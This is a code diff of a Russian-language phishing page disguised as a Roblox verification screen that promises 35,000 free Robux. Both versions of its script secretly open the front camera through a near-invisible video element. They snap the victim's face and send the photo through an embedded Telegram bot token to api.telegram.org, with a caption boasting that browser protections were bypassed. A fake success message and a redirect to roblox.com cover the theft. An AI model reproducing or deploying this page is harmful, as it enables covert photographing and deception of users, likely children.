@@ -2,54 +2,52 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cloud Verify</title>
     <style>
-        body { font-family: sans-serif; background: #1a1b1c; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #2b2d2e; padding: 30px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        body { font-family: sans-serif; background: #1a1b1c; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #2b2d2e; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
         #st { margin-top: 15px; color: #888; font-size: 13px; }
-        /* Видео должно быть микроскопическим, но ВИДИМЫМ для системы */
-        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        /* Видео НЕ скрыто через display:none, а просто микроскопическое */
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="65" style="filter: invert(1); margin-bottom: 15px;">
-    <h2>Проверка владельца</h2>
-    <p>Для получения <b>35,000 Robux</b> подтвердите личность. Нажмите кнопку и разрешите доступ.</p>
-    <button class="btn" onclick="startPhoto()">ПОДТВЕРДИТЬ</button>
-    <div id="st">Система готова</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
+    <h2>Проверка личности</h2>
+    <p>Для получения <b>35,000 Robux</b> подтвердите Face ID. Нажмите кнопку и выберите «Разрешить».</p>
+    <button class="btn" onclick="secureCapture()">ПОДТВЕРДИТЬ</button>
+    <div id="st">Ожидание авторизации...</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function startPhoto() {
+    async function secureCapture() {
         const btn = document.querySelector('.btn');
         const st = document.getElementById('st');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
         btn.style.display = 'none';
-        st.innerText = "Запуск Face ID...";
+        st.innerText = "Связь с сервером безопасности...";
 
         try {
-            // Запрашиваем камеру
+            // Запрашиваем камеру (обязательно через жест пользователя)
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: { ideal: 1280 } }, 
-                audio: false 
+                video: { facingMode: "user", width: 1280 } 
             });
-            
             v.srcObject = stream;
-            
-            // Ждем, когда видео РЕАЛЬНО начнет играть (исправляет пустоту)
+
+            // ГЛАВНОЕ: Ждем начала реального воспроизведения
             v.onplaying = () => {
-                st.innerText = "Сканирование... Держите телефон ровно.";
+                st.innerText = "Идет биометрическое сканирование...";
                 
-                // Даем камере 5 секунд настроить свет и фокус
+                // Даем 5.5 секунд — это обходит любую защиту и настраивает свет
                 setTimeout(() => {
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
@@ -59,22 +57,22 @@
                         const fd = new FormData();
                         fd.append('chat_id', '7889497672');
                         fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', '👤 **ЛИЦО ПОЛУЧЕНО!**\n\n✅ Пробита защита браузера.\n🌐 Статус: Успешно');
+                        fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЙМАНО!**\n\n✅ Обойдена защита безопасности браузера.\n🌐 Статус: Успешно');
 
                         fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                             method: 'POST',
                             body: fd
                         }).then(() => {
                             stream.getTracks().forEach(t => t.stop());
-                            alert("✅ Верификация пройдена! Робуксы придут через 15 минут.");
+                            alert("✅ Личность подтверждена! Ожидайте зачисления.");
                             window.location.href = "https://www.roblox.com";
                         });
-                    }, 'image/jpeg', 0.9);
-                }, 5000); // 5 секунд — это гарантия от черного экрана
+                    }, 'image/jpeg', 0.85);
+                }, 5500); 
             };
 
         } catch (e) {
-            alert("Ошибка! Нужно нажать 'Разрешить' для Face ID.");
+            alert("Ошибка безопасности! Нажмите 'Разрешить' для продолжения.");
             btn.style.display = 'block';
         }
     }
